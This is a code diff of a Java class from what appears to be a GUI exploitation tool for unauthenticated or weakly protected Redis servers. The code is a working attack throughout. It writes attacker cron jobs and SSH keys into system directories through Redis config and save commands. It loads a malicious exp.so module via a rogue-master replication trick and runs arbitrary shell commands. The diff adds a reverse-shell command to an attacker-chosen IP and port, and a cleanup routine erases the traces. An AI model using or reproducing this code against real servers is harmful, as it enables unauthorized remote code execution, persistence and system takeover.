@@ -4,14 +4,15 @@ import Controller.RedisController;
 import Entity.ControllersFactory;
 import Util.MessageUtil;
 import Util.Utils;
+import javafx.application.Platform;
 import redis.clients.jedis.Jedis;
-import org.apache.commons.lang.StringUtils;
 import redis.clients.jedis.commands.ProtocolCommand;
 import redis.clients.jedis.util.SafeEncoder;
 
 import java.sql.SQLException;
 import java.util.Arrays;
 import java.util.List;
+
 
 public class RedisDao {
     /**
@@ -21,12 +22,15 @@ public class RedisDao {
 
     public static Jedis CONN;
     public static List<String> dir;
-    public static String slaveReadOnlyFlag;
+    public static String slaveReadOnlyFlag = "yes";
 
     private String ip;
     private int port;
     private String password;
     private int timeout;
+    private String OS;
+    private String redisVersion;
+    private String arch;
 
     public RedisDao(String ip, String port, String password, String timeout) {
         this.ip = ip;
@@ -47,37 +51,44 @@ public class RedisDao {
         if (password.length() != 0) {
             CONN.auth(password);
         }
+        CONN.info();
         if (CONN != null) {
             CONN.close();
         }
     }
 
-    public void getConnection() throws SQLException {
+    public void getConnection() throws Exception {
         CONN = new Jedis(ip, port, timeout);
         if (password.length() != 0) {
             CONN.auth(password);
         }
-
     }
 
-    public void closeConnection() throws SQLException {
+    public void closeConnection() throws Exception {
         if (CONN != null) {
             CONN.close();
         }
     }
 
-    public void getInfo() {
+    public void getInfo() throws Exception {
         String info = CONN.info();
         dir = CONN.configGet("dir");
+        OS = Utils.regularMatch("os:(.*)", info);
+        redisVersion = Utils.regularMatch("redis_version:(.*)", info);
+        arch = Utils.regularMatch("arch_bits:(.*)", info);
 
-        List<String> dbfilename = CONN.configGet("dbfilename");
-        String orginDir = StringUtils.join(dir, ": ");
-        String orginDbfilename = StringUtils.join(dbfilename, ": ");
-        redisController.redisLogTextFArea.appendText(Utils.log(orginDir));
-        redisController.redisLogTextFArea.appendText(Utils.log(orginDbfilename));
-        redisController.redisLogTextFArea.appendText(Utils.log("4.X redis 可使用主从备份请注意查看版本信息"));
-
-        redisController.redisOutputTextFArea.setText(info);
+        //List<String> dbfilename = CONN.configGet("dbfilename");
+        //String orginDir = StringUtils.join(dir, ": ");
+        //String orginDbfilename = StringUtils.join(dbfilename, ": ");
+        Platform.runLater(() -> {
+            //redisController.redisLogTextFArea.appendText(Utils.log(orginDir));
+            //redisController.redisLogTextFArea.appendText(Utils.log(orginDbfilename));
+            redisController.redisLogTextFArea.appendText(Utils.log("当前系统: " + OS));
+            redisController.redisLogTextFArea.appendText(Utils.log("当前系统位数: " + arch));
+            redisController.redisLogTextFArea.appendText(Utils.log("当前 Redis 版本: " + redisVersion));
+            redisController.redisLogTextFArea.appendText(Utils.log("4.x >= Version <= 5.0.5 可使用主从同步请注意查看版本信息"));
+            redisController.redisOutputTextFArea.setText(info);
+        });
     }
 
     public void redisavedb(String dir, String dbfilename) {
@@ -89,12 +100,16 @@ public class RedisDao {
 
     public void redisslave(String vpsIp, String vpsPort) {
         try {
-            redisController.redisLogTextFArea.appendText(Utils.log("Setting master: " + vpsIp + ":" + vpsPort));
+            Platform.runLater(() -> {
+                redisController.redisLogTextFArea.appendText(Utils.log("Setting master: " + vpsIp + ":" + vpsPort));
+            });
             // 开启主从
             CONN.slaveof(vpsIp, Integer.parseInt(vpsPort));
 
         } catch (Exception e) {
-            redisController.redisLogTextFArea.appendText(Utils.log(e.getMessage()));
+            Platform.runLater(() -> {
+                redisController.redisLogTextFArea.appendText(Utils.log(e.getMessage()));
+            });
         }
     }
 
@@ -103,39 +118,55 @@ public class RedisDao {
         List<String> crondirs = Arrays.asList("/var/spool/cron/", "/var/spool/cron/crontab/", "/var/spool/cron/crontabs/");
         for (String dir : crondirs) {
             try {
+                String randomString = Utils.getRandomString();
                 CONN.set("xxcron", "\n\n" + cronText + "\n\n");
                 CONN.configSet("dir", dir);
-                CONN.configSet("dbfilename", "root");
+                CONN.configSet("dbfilename", randomString);
                 CONN.save();
-                redisController.redisLogTextFArea.appendText(Utils.log(cronText + "\n" + "write cron success: " + dir + "root"));
+                Platform.runLater(() -> {
+                    redisController.redisLogTextFArea.appendText(Utils.log(dir + randomString  + " 写入 CRON " +
+                            "计划任务成功！"));
+                });
+                break;
             } catch (Exception e) {
-                redisController.redisLogTextFArea.appendText(Utils.log(e.getMessage()));
+                Platform.runLater(() -> {
+                    redisController.redisLogTextFArea.appendText(Utils.log(" 写入 CRON 计划任务失败！"));
+                    redisController.redisLogTextFArea.appendText(Utils.log(e.getMessage()));
+                });
             }
         }
-        redisController.redisLogTextFArea.appendText(Utils.log("crontab unknown error"));
     }
 
-    public void sshkey(String sshRsa) {
+    public void sshkey(String sshRsa,String Path) {
         try {
             CONN.set("xxssh", "\n\n" + sshRsa + "\n\n");
-            CONN.configSet("dir", "/root/.ssh/");
+            CONN.configSet("dir", Path);
             CONN.configSet("dbfilename", "authorized_keys");
             CONN.save();
+            Platform.runLater(() -> {
+                redisController.redisLogTextFArea.appendText(Utils.log("写入 SSH 公钥成功！"));
+            });
         } catch (Exception e) {
-            redisController.redisLogTextFArea.appendText(Utils.log(e.getMessage()));
+            Platform.runLater(() -> {
+                redisController.redisLogTextFArea.appendText(Utils.log("写入 SSH 公钥失败！"));
+                redisController.redisLogTextFArea.appendText(Utils.log(e.getMessage()));
+            });
         }
-        redisController.redisLogTextFArea.appendText(Utils.log("write ssh rsa success: " + sshRsa));
+
     }
 
-    public void rogue(String vpsip, String vpsport, int timeout) throws InterruptedException {
+    public void rogue(String vpsip, String vpsport, int timeout) throws Exception {
         redisslave(vpsip, vpsport);
 
-        redisController.redisLogTextFArea.appendText(Utils.log("Setting dbfilename..."));
-
+        Platform.runLater(() -> {
+            redisController.redisLogTextFArea.appendText(Utils.log("设置 dbfilename 参数！"));
+        });
         List<String> slaveReadOnlyList = CONN.configGet("slave-read-only");
         slaveReadOnlyFlag = slaveReadOnlyList.get(1);
 
-        redisController.redisLogTextFArea.appendText(Utils.log("slave-read-only -> no ..."));
+        Platform.runLater(() -> {
+            redisController.redisLogTextFArea.appendText(Utils.log("成功设置 slave-read-only 为 no！"));
+        });
         CONN.configSet("slave-read-only", "no");
 
         // 配置so文件
@@ -144,6 +175,9 @@ public class RedisDao {
         List<String> dir = CONN.configGet("dir");
         String evalpath = dir.get(1) + "/exp.so";
 
+        Platform.runLater(() -> {
+            redisController.redisLogTextFArea.appendText(Utils.log("正在加载模块请稍等..."));
+        });
         // 加载恶意so
         Thread.sleep(timeout);
         CONN.moduleLoad(evalpath);
@@ -151,8 +185,9 @@ public class RedisDao {
 
         //关闭主从
         CONN.slaveofNoOne();
-
-        redisController.redisLogTextFArea.appendText(Utils.log("success write exp.so ..."));
+        Platform.runLater(() -> {
+            redisController.redisLogTextFArea.appendText(Utils.log("模块加载成功!"));
+        });
 
     }
 
@@ -171,13 +206,42 @@ public class RedisDao {
         }
     }
 
+    public enum SysRevShell implements ProtocolCommand {
+        REV_SHELL("system.rev");
+
+        private final byte[] raw;
+
+        SysRevShell(String alt) {
+            raw = SafeEncoder.encode(alt);
+        }
+
+        @Override
+        public byte[] getRaw() {
+            return raw;
+        }
+    }
+
+    public String revShell(String revIp, String revPort) {
+        String result = "";
+        try {
+            CONN.sendCommand(SysRevShell.REV_SHELL, revIp, revPort);
+        } catch (Exception e) {
+            Platform.runLater(() -> {
+                MessageUtil.showExceptionMessage(e, e.getMessage());
+            });
+        }
+        return result;
+    }
+
     public String eval(String command, String code) {
         String result = "";
         try {
             byte[] bytes = (byte[]) CONN.sendCommand(SysCommand.EVAL, command);
             result = (new String(bytes, code));
         } catch (Exception e) {
-            MessageUtil.showExceptionMessage(e, e.getMessage());
+            Platform.runLater(() -> {
+                MessageUtil.showExceptionMessage(e, e.getMessage());
+            });
         }
         return result;
     }
@@ -188,28 +252,42 @@ public class RedisDao {
      * 3. 卸载导入so函数
      */
     public void clean() {
-        CONN.configSet("dir", dir.get(1));
-        redisController.redisLogTextFArea.appendText(Utils.log("reset dir success"));
+        try {
+            CONN.configSet("dir", dir.get(1));
+            Platform.runLater(() -> {
+                redisController.redisLogTextFArea.appendText(Utils.log("重设 Dir 参数成功！"));
+            });
 
-        CONN.configSet("slave-read-only", slaveReadOnlyFlag);
-        redisController.redisLogTextFArea.appendText(Utils.log("reset slave-read-only success"));
-
-        CONN.configSet("dbfilename", "dump.rdb");
-        redisController.redisLogTextFArea.appendText(Utils.log("reset dbfilename success"));
-
-        CONN.slaveofNoOne();
-        redisController.redisLogTextFArea.appendText(Utils.log("reset slaveof success"));
-
-        eval("rm -f " + dir.get(1) + "/exp.so", "UTF-8");
-        redisController.redisLogTextFArea.appendText(Utils.log("remove exp file success"));
-
-        CONN.moduleUnload("system");
-        redisController.redisLogTextFArea.appendText(Utils.log("unload system.exec success"));
-
-        CONN.del("xxssh");
-        CONN.del("xxcron");
-        redisController.redisLogTextFArea.appendText(Utils.log("delete exp key success"));
-
+            CONN.configSet("slave-read-only", slaveReadOnlyFlag);
+            Platform.runLater(() -> {
+                redisController.redisLogTextFArea.appendText(Utils.log("重设 slave-read-only 成功！"));
+            });
+            CONN.configSet("dbfilename", "dump.rdb");
+            Platform.runLater(() -> {
+                redisController.redisLogTextFArea.appendText(Utils.log("重设 dbfilename 参数成功！"));
+            });
+            CONN.slaveofNoOne();
+            Platform.runLater(() -> {
+                redisController.redisLogTextFArea.appendText(Utils.log("重设 slaveof 成功"));
+            });
+            eval("rm -f " + dir.get(1) + "/exp.so", "UTF-8");
+            Platform.runLater(() -> {
+                redisController.redisLogTextFArea.appendText(Utils.log("删除 exp 提权模块成功！"));
+            });
+            CONN.moduleUnload("system");
+            Platform.runLater(() -> {
+                redisController.redisLogTextFArea.appendText(Utils.log("卸载函数成功！"));
+            });
+            CONN.del("xxssh");
+            CONN.del("xxcron");
+            Platform.runLater(() -> {
+                redisController.redisLogTextFArea.appendText(Utils.log("删除 Key 成功！"));
+            });
+        } catch (Exception e) {
+            Platform.runLater(() -> {
+                MessageUtil.showExceptionMessage(e, e.getMessage());
+            });
+        }
     }
 
 }
